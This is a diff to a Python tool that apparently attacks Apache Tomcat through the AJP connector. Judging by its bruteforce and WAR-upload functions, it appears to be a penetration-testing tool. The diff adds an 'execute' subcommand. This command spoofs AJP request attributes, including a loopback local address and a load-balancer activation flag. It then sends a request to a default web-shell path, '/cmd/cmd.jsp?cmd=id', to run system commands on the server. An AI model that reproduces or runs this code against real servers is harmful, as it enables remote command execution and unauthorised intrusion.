@@ -253,6 +253,13 @@ if __name__ == "__main__":
 #	parser_req.set_defaults(which='req')
 #	parser_req.add_argument("-m", "--method", type=str, default="GET", help="Request method (default=GET)", choices=AjpForwardRequest.REQUEST_METHODS.keys())
 
+	parser_execute = subparsers.add_parser('execute', help='Upload WAR')
+	parser_execute.set_defaults(which='execute')
+	parser_execute.add_argument("-u", "--user", type=str, default=None, help="Username")
+	parser_execute.add_argument("-p", "--password", type=str, default=None, help="Password")
+	parser_execute.add_argument("-m", "--method", type=str, default="GET", help="Request method (default=GET)", choices=AjpForwardRequest.REQUEST_METHODS.keys())
+	parser_execute.add_argument("req_uri", type=str, default="/cmd/cmd.jsp?cmd=id", help="Url to execute")
+
 	parser_upload = subparsers.add_parser('upload', help='Upload WAR')
 	parser_upload.set_defaults(which='upload')
 	parser_upload.add_argument("filename", type=str, help="WAR file to upload")
@@ -277,6 +284,17 @@ if __name__ == "__main__":
 		bf.start_bruteforce(args.users, args.passwords, args.req_uri, args.stop)
 #	elif args.which == 'req':
 #		print bf.perform_request(args.req_uri, args.headers, args.method, args.user, args.password)
+	elif args.which == 'execute':
+		attributes = [	{"name": "req_attribute", "value": ("AJP_REMOTE_PORT", "{}".format(bf.socket.getsockname()[1]))},
+				{"name": "req_attribute", "value":("AJP_LOCAL_ADDR", "::1")},
+				{"name": "req_attribute", "value": ("JK_LB_ACTIVATION", "ACT")}
+			]
+		uri, query = args.req_uri.split('?', 1)
+		if query is not None:
+			# FIXME urlencode ?
+			attributes.append({"name": "query_string", "value": query})
+		# FIXME test with POST method
+		bf.perform_request(uri, {}, args.method, args.user, args.password, attributes=attributes)
 	elif args.which == 'upload':
 		bf.upload(args.filename, args.user, args.password, args.old_version, args.headers)
 	elif args.which == 'version':	
